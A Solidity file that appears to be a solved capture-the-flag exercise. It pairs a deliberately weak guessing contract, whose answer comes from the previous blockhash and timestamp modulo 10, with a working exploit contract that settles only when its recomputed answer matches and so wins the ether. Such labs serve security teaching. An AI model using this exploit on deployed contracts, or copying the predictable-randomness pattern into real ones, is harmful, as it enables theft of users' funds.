// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PredictTheFuture {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;

        guesser = address(0);
        if (guess == answer) {
            (bool ok, ) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to send to msg.sender");
        }
    }
}

contract ExploitContract {
    PredictTheFuture public predictTheFuture;
    uint8 guess;

    constructor(PredictTheFuture _predictTheFuture) {
        predictTheFuture = _predictTheFuture;
    }

    // Write your exploit code below
    function lockInGuess() public payable {
        guess = 1;
        predictTheFuture.lockInGuess{value: 1 ether}(guess);
    }

    /// @dev instead of trying to find a time ahead that works, we have guess a number and dont
    /// settle until the guess is correct
    /// @dev this is possible because the answer is % 10 so their is only 10 possible answers and
    /// it is bound to come up
    function exploit() public {
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;

        if (answer == guess) {
            predictTheFuture.settle();
        }
    }

    receive() external payable {}

    fallback() external payable {}
}
